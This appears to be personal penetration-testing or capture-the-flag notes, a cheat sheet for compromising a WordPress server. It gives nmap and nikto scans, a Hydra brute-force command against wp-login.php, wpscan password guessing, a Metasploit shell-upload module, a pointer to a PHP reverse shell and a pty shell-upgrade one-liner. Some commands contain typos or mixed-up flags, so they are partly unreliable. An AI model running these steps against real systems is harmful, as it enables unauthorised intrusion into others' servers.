---
header:
  
layout: single
classes: wide

---

## SYSTEM HACKING

* To discover the system in the network, use either Nmap or Netdiscover
* To scan for vulnerabilities use nikto.
  * Command to run : `nikto -h <HOST_IP>`
* To scan for vulnerbilities we can use Nmap alos.
  * `namp -sV <HOST_IP>`
  * `nmap --script vuln <HOST_IP>`
* If port 80 is open, use robots.txt to find any hidden flags.
* If /wp-login.php is found in the Vulnerability scanning, it can be Wordpress site.
* Use Burpsuite to see login data
* Use Hydra to bruteforce username
  * `hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username`
* Use wpscan tool to scan Wordpress Website
  * `gem install wpscan`
  * `wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic`
* We can use metasploit to exploit the server
  * use exploit/unix/webapp/wp_admin_shell_upload -- Does not work
  * pentestmonkey.net/tools/web-shells/php-reverse-shell
* Command to get Bash shell
  * `python -c "import pty;pty.spawn('/bin/bash')"`
